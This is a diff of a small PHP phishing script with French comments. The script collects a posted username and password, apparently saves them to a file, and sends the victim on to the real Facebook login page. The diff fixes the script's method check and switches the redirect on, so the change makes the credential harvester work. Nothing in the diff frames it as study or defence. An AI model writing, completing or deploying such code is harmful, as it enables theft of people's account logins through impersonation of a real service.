@@ -1,5 +1,5 @@
 <?php
-if ($_SERVER["REQUEST_METHOD"] == "GET") {
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = $_POST['username'];
     $password = $_POST['password'];
 
@@ -10,8 +10,8 @@ if ($_SERVER["REQUEST_METHOD"] == "GET") {
         fclose($file);
 
         // Rediriger l'utilisateur vers la vraie page de connexion
-        //header("Location: https://facebook.com/login");
-        echo "C'était une Réussite Totale";
+        header("Location: http://facebook.com/login");
+        //echo "C'était une Réussite Totale";
 	exit();
     } 
 }
